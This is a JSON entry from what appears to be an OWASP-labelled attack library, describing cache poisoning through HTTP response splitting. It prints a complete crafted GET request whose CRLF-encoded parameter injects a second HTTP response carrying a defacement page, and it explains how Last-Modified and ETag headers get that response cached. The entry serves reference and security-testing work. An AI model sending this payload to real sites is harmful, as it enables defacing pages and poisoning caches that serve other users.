{
  "id": "122",
  "name": "Cache Poisoning - Using HTTP Response Splitting we force cache server to generate two responses to one request",
  "description": "\n\nGET http://testsite.com/redir.php?site=%0d%0aContent-\nLength:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aLast-\nModified:%20Mon,%2027%20Oct%202009%2014:50:18%20GMT%0d%0aConte\nnt-Length:%2020%0d%0aContent-\nType:%20text/html%0d%0a%0d%0a<html>deface!</html> HTTP/1.1\nHost: testsite.com\nUser-Agent: Mozilla/4.7 [en] (WinNT; I)\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,\nimage/png, */*\nAccept-Encoding: gzip\nAccept-Language: en\nAccept-Charset: iso-8859-1,*,utf-8\n\nWe are intentionally setting the future time (in the header it's set to 27 October 2009) in the second response HTTP header \"Last-Modified\" to store the response in the cache.\n\nWe may get this effect by setting the following headers:\nLast-Modified (checked byt the If-Modified-Since header)\nETag (checked by the If-None-Match header)\n\nReference: https://www.owasp.org/index.php/Cache_Poisoning",
  "labels": "OWASP",
  "libraryId": "1",
  "guid": "cae9b9f9-de9b-46c8-9b16-cc9142e7b088",
  "isHidden": false,
  "isReadOnlyLibraryEntity": false,
  "libraryGuid": "eef7dcf9-53bd-48e9-849d-21445ebad101"
}